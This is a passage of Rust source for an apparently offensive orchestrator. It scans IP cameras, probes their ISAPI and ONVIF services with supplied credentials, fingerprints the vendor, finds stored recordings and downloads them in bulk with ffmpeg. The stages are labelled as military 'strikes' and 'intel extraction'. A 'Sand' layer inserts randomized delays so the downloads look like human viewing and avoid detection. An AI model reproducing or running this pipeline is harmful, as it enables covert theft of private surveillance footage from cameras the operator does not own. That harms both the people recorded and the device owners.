    if filename.is_empty() { filename = format!("onvif_{}.mp4", Utc::now().timestamp()); }
    if !filename.contains('.') { filename.push_str(".mp4"); }
    let path = dir.join(&filename);
    let ffmpeg = get_vault_path().join("ffmpeg.exe");

    let mut child = std::process::Command::new(&ffmpeg)
        .args(["-y", "-rtsp_transport", "tcp", "-i", &replay_uri,
               "-t", "120", "-c", "copy", &path.to_string_lossy()])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::piped())
        .spawn().map_err(|e| format!("ffmpeg: {}", e))?;

    let started = Instant::now();
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                if !status.success() { return Err("ffmpeg error".into()); }
                break;
            }
            Ok(None) => {
                if started.elapsed() > Duration::from_secs(180) {
                    let _ = child.kill();
                    return Err("ffmpeg timeout".into());
                }
                tokio::time::sleep(Duration::from_secs(2)).await;
                if let Ok(meta) = std::fs::metadata(&path) {
                    if meta.len() > 0 {
                        let _ = tx.send(HyperionEvent::NexusLog {
                            message: format!("DOWNLOAD_PROGRESS|{}|{}|0", task_key, meta.len()),
                        }).await;
                    }
                }
            }
            Err(e) => return Err(format!("ffmpeg wait: {}", e)),
        }
    }

    let save_path = path.to_string_lossy().to_string();
    let sz = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🏖️ [SAND] ONVIF done: {} ({} bytes, {:.1}s)", filename, sz, started.elapsed().as_secs_f64()),
    }).await;
    Ok(save_path)
}


// =============================================================================
// 4. ГЛАВНЫЙ ОРКЕСТРАТОР (с Песком на всех уровнях)
// =============================================================================

pub struct HyperionMaster {
    pub tx: mpsc::Sender<HyperionEvent>,
}

impl HyperionMaster {
    pub fn boot_with_log_bridge() -> (Self, mpsc::Receiver<String>) {
        println!("===================================================");
        println!("🚀 [HYPERION PRIME] ЗАПУСК С ПРОТОКОЛОМ «ПЕСОК»...");
        println!("===================================================");

        let (tx, mut rx) = mpsc::channel::<HyperionEvent>(1000);
        let (log_tx, log_rx) = mpsc::channel::<String>(500);
        let tx_internal = tx.clone();

        tokio::spawn(async move {
            println!("[MASTER] Шина событий + Sand Engine активны.");

            while let Some(event) = rx.recv().await {
                // NexusLog → лог-канал
                if let HyperionEvent::NexusLog { ref message } = event {
                    let _ = log_tx.send(message.clone()).await;
                    continue;
                }

                // Логируем каждое событие
                let summary = match &event {
                    HyperionEvent::TargetDiscovered { ip, port, .. } =>
                        Some(format!("☢️ [NEXUS] Цель: {}:{}", ip, port)),
                    HyperionEvent::AnalyzeTarget { ip, .. } =>
                        Some(format!("🧠 [BRAIN] Анализ {}...", ip)),
                    HyperionEvent::TargetAnalyzed { ip, vendor, device_model, .. } =>
                        Some(format!("⚖️ [VERDICT] {}: {} ({})", ip, vendor, device_model.as_deref().unwrap_or("?"))),
                    HyperionEvent::ExecuteStrike { ip, vendor, .. } =>
                        Some(format!("🥷 [SPETSNAZ] Штурм {} ({})", ip, vendor)),
                    HyperionEvent::ExtractIntel { ip, isapi_recordings, onvif_recordings, .. } =>
                        Some(format!("🔑 [CIPHER] ISAPI:{} ONVIF:{} для {}", isapi_recordings.len(), onvif_recordings.len(), ip)),
                    HyperionEvent::TransportCargo { ip, download_tasks, .. } =>
                        Some(format!("🚚 [TRANSPORT] {} задач для {}", download_tasks.len(), ip)),
                    HyperionEvent::OperationComplete { ip, result } =>
                        Some(format!("✅ [COMPLETE] {} : {}", ip, result)),
                    HyperionEvent::OperationFailed { ip, reason } =>
                        Some(format!("❌ [FAILED] {} : {}", ip, reason)),
                    _ => None,
                };
                if let Some(msg) = summary { let _ = log_tx.send(msg).await; }

                // === DISPATCH ===
                match event {
                    HyperionEvent::TargetDiscovered { ip, port, login, pass } => {
                        let _ = tx_internal.send(HyperionEvent::AnalyzeTarget { ip, port, login, pass }).await;
                    }

                    HyperionEvent::AnalyzeTarget { ip, port, login, pass } => {
                        let tx_b = tx_internal.clone();
                        tokio::spawn(async move {
                            let host = normalize_host(&ip);
                            if host.is_empty() {
                                let _ = tx_b.send(HyperionEvent::OperationFailed { ip, reason: "Пустой хост".into() }).await;
                                return;
                            }
                            let mut rng = SandRng::new();

                            // Фаза 1: Порты
                            let _ = tx_b.send(HyperionEvent::NexusLog { message: format!("🧠 Сканирование портов {}...", host) }).await;
                            let open_ports = scan_ports(&host, &tx_b).await;
                            let _ = tx_b.send(HyperionEvent::NexusLog { message: format!("🧠 Открытые порты: {:?}", open_ports) }).await;

                            if open_ports.is_empty() {
                                let _ = tx_b.send(HyperionEvent::OperationFailed { ip, reason: "Все порты закрыты".into() }).await;
                                return;
                            }

                            // Песок между фазами Brain
                            sand_sleep(&mut rng, 300, 800, &tx_b, "inter-phase").await;

                            // Фаза 2: Протоколы (параллельно, но каждый внутри с песком)
                            let _ = tx_b.send(HyperionEvent::NexusLog { message: "🧠 Проверка ISAPI/ONVIF...".into() }).await;
                            let (isapi_ep, onvif_ep) = tokio::join!(
                                probe_isapi(&host, &login, &pass, &tx_b),
                                probe_onvif(&host, &tx_b)
                            );
                            let _ = tx_b.send(HyperionEvent::NexusLog {
                                message: format!("🧠 ISAPI: {} | ONVIF: {}",
                                    isapi_ep.as_deref().unwrap_or("—"),
                                    onvif_ep.as_deref().unwrap_or("—")),
                            }).await;

                            if isapi_ep.is_none() && onvif_ep.is_none() {
                                let _ = tx_b.send(HyperionEvent::OperationFailed { ip, reason: "ISAPI/ONVIF не обнаружены".into() }).await;
                                return;
                            }

                            sand_sleep(&mut rng, 200, 600, &tx_b, "pre-vendor").await;

                            // Фаза 3: Вендор
                            let _ = tx_b.send(HyperionEvent::NexusLog { message: "🧠 Определение вендора...".into() }).await;
                            let (vendor, model) = fetch_device_info(&host, &login, &pass, &tx_b).await;
                            let _ = tx_b.send(HyperionEvent::NexusLog {
                                message: format!("🧠 Вендор: {} | Модель: {}", vendor, model.as_deref().unwrap_or("n/a")),
                            }).await;

                            let _ = tx_b.send(HyperionEvent::TargetAnalyzed {
                                ip, port, login, pass, vendor, open_ports,
                                isapi_endpoint: isapi_ep, onvif_endpoint: onvif_ep, device_model: model,
                            }).await;
                        });
                    }

                    HyperionEvent::TargetAnalyzed { ip, port, login, pass, vendor, isapi_endpoint, onvif_endpoint, .. } => {
                        if isapi_endpoint.is_some() || onvif_endpoint.is_some() {
                            let _ = tx_internal.send(HyperionEvent::ExecuteStrike {
                                ip, port, login, pass, vendor, isapi_endpoint, onvif_endpoint,
                            }).await;
                        } else {
                            let _ = tx_internal.send(HyperionEvent::OperationFailed { ip, reason: "Нет протоколов".into() }).await;
                        }
                    }

                    HyperionEvent::ExecuteStrike { ip, login, pass, vendor, isapi_endpoint, onvif_endpoint, .. } => {
                        let tx_s = tx_internal.clone();
                        tokio::spawn(async move {
                            let host = normalize_host(&ip);
                            let mut rng = SandRng::new();

                            let _ = tx_s.send(HyperionEvent::NexusLog { message: format!("🥷 Поиск записей {}...", host) }).await;

                            // Песок: пауза перед штурмом
                            sand_sleep(&mut rng, 500, 1500, &tx_s, "pre-strike").await;

                            // Поиск (внутри каждого — свой песок)
                            let (ih, oh) = tokio::join!(
                                async { if isapi_endpoint.is_some() { search_isapi(&host, &login, &pass, &tx_s).await } else { vec![] } },
                                async { if onvif_endpoint.is_some() { search_onvif(&host, &login, &pass, &tx_s).await } else { vec![] } }
                            );

                            let _ = tx_s.send(HyperionEvent::NexusLog {
                                message: format!("🥷 Результат: ISAPI={}, ONVIF={}", ih.len(), oh.len()),
                            }).await;

                            if ih.is_empty() && oh.is_empty() {
                                let _ = tx_s.send(HyperionEvent::OperationFailed { ip, reason: "Записи не найдены".into() }).await;
                                return;
                            }
                            let _ = tx_s.send(HyperionEvent::ExtractIntel {
                                ip, login, pass, vendor, isapi_recordings: ih, onvif_recordings: oh,
                            }).await;
                        });
                    }

                    HyperionEvent::ExtractIntel { ip, login, pass, isapi_recordings, onvif_recordings, .. } => {
                        let mut tasks: Vec<DownloadTask> = Vec::new();
                        for (i, hit) in isapi_recordings.iter().enumerate() {
                            if let Some(ref uri) = hit.playback_uri {
                                tasks.push(DownloadTask::IsapiPlayback {
                                    playback_uri: uri.clone(), login: login.clone(), pass: pass.clone(),
                                    filename_hint: format!("isapi_{}_{}_{}.mp4",
                                        normalize_host(&ip), hit.track_id.as_deref().unwrap_or("trk"), i),
                                });
                            }
                        }
                        for (i, hit) in onvif_recordings.iter().enumerate() {
                            tasks.push(DownloadTask::OnvifToken {
                                endpoint: hit.endpoint.replace("recording_service", "replay_service"),
                                recording_token: hit.token.clone(), login: login.clone(), pass: pass.clone(),
                                filename_hint: format!("onvif_{}_{}.mp4", normalize_host(&ip), i),
                            });
                        }

                        let _ = tx_internal.send(HyperionEvent::NexusLog {
                            message: format!("🔑 {} задач сформировано для {}", tasks.len(), ip),
                        }).await;

                        if tasks.is_empty() {
                            let _ = tx_internal.send(HyperionEvent::OperationComplete {
                                ip, result: "Записи есть, но нет URI для скачивания".into(),
                            }).await;
                        } else {
                            let _ = tx_internal.send(HyperionEvent::TransportCargo { ip, login, pass, download_tasks: tasks }).await;
                        }
                    }

                    // ============================================================
                    // TRANSPORT С ПЕСКОМ: межзадачные паузы + chunk jitter внутри
                    // ============================================================
                    HyperionEvent::TransportCargo { ip, download_tasks, .. } => {
                        let tx_t = tx_internal.clone();
                        tokio::spawn(async move {
                            let total = download_tasks.len();
                            let mut ok = 0usize;
                            let mut fail = 0usize;
                            let mut rng = SandRng::new();
                            let sand = SandProfile::standard();

                            for (i, task) in download_tasks.into_iter().enumerate() {
                                // Песок: пауза между задачами (имитация паузы между «просмотрами»)
                                if i > 0 {
                                    sand_sleep(&mut rng, sand.task_delay_min_ms, sand.task_delay_max_ms,
                                        &tx_t, &format!("inter-task {}/{}", i+1, total)).await;
                                }

                                let _ = tx_t.send(HyperionEvent::NexusLog {
                                    message: format!("🚚 Задача {}/{} для {}", i+1, total, ip),
                                }).await;

                                let res = match task {
                                    DownloadTask::IsapiPlayback { playback_uri, login, pass, filename_hint } =>
                                        sand_download_isapi(&playback_uri, &login, &pass, &filename_hint, &tx_t).await,
                                    DownloadTask::OnvifToken { endpoint, recording_token, login, pass, filename_hint } =>
                                        sand_download_onvif(&endpoint, &recording_token, &login, &pass, &filename_hint, &tx_t).await,
                                    DownloadTask::RtspCapture { source_url, filename_hint, duration_seconds } => {
                                        // RTSP — ffmpeg напрямую (песок не нужен, RTSP — это стрим)
                                        let dir = get_vault_path().join("archives").join("nexus_rtsp");
                                        let _ = std::fs::create_dir_all(&dir);
                                        let p = dir.join(&filename_hint);
                                        let ff = get_vault_path().join("ffmpeg.exe");
                                        match std::process::Command::new(&ff)
                                            .args(["-y", "-rtsp_transport", "tcp", "-i", &source_url,
                                                   "-t", &duration_seconds.to_string(), "-c", "copy", &p.to_string_lossy()])
                                            .stdout(std::process::Stdio::null()).stderr(std::process::Stdio::null()).spawn()
                                        {
                                            Ok(mut c) => match c.wait() {
                                                Ok(s) if s.success() => Ok(p.to_string_lossy().to_string()),
                                                _ => Err("ffmpeg failed".into()),
                                            },
                                            Err(e) => Err(format!("ffmpeg: {}", e)),
                                        }
                                    }
                                };
                                match res {
                                    Ok(_) => ok += 1,
                                    Err(e) => { fail += 1; let _ = tx_t.send(HyperionEvent::NexusLog { message: format!("🚚 ОШИБКА: {}", e) }).await; }
                                }
                            }

                            let _ = tx_t.send(HyperionEvent::OperationComplete {
                                ip, result: format!("{}/{} загружено, {} ошибок", ok, total, fail),
                            }).await;
                        });
                    }

                    HyperionEvent::OperationComplete { .. } | HyperionEvent::OperationFailed { .. } => {}
                    HyperionEvent::NexusLog { .. } => {}
                }
            }
        });

        (Self { tx }, log_rx)
    }
}
